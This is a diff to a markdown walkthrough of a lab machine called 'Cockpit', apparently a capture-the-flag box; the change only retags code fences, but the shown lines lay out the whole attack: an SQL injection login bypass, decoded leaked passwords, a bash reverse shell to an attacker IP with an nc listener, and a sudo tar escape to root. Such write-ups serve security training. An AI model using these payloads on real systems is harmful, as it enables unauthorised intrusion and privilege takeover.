@@ -3,7 +3,7 @@
 # 🐧Cockpit🐧
 ## Enumeration
 Nmap
-```
+```console
 $ nmap -sC -sV 192.168.139.10 
 Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-05 15:55 AEDT
 Nmap scan report for 192.168.139.10
@@ -25,29 +25,29 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 port 80 and 9090 are both login page    
 tried the default credential not working    
 then try sql injection    
-```
+```console
 Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%' AND password like '%%'' at line 1
 ```
 confirmed is vulnerable to sql    
 use sql login bypass  
-```
+```console
 admin' #
 ```
 successfully logged in    
 got two users and passwords  
-```
+```console
 james 	Y2FudHRvdWNoaGh0aGlzc0A0NTUxNTI=
 cameron 	dGhpc3NjYW50dGJldG91Y2hlZGRANDU1MTUy
 ```
 use base64 decode and got two password  
-```
+```console
 canttouchhhthiss@455152
 thisscanttbetouchedd@455152
 ```
 login with port 9090 with james credential   
 it is running Ubuntu  
 get a reverse shell in the terminal  
-```
+```console
 bash -i >& /dev/tcp/192.168.45.178/9090 0>&1
 
 $ nc -lvnp 9090
@@ -60,7 +60,7 @@ uid=1000(james) gid=1000(james) groups=1000(james)
 ## Privilege Escalation  
 
 run sudo -l and found we can run tar as root without passwd
-```
+```console
 james@blaze:~$ sudo -l
 sudo -l
 Matching Defaults entries for james on blaze:
@@ -72,15 +72,15 @@ User james may run the following commands on blaze:
 ```
 From the GTFObin we can find a exploit for running Tar command  
 https://gtfobins.org/gtfobins/tar/#shell
-```
+```console
 sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
 ```
 we will change the file path to match the command
-```
+```console
 $ sudo /usr/bin/tar -czvf /tmp/backup.tar.gz * --checkpoint=1 --checkpoint-action=exec="/bin/sh"
 ```
 and we got root after
-```
+```console
 # id
 uid=0(root) gid=0(root) groups=0(root)
 ```
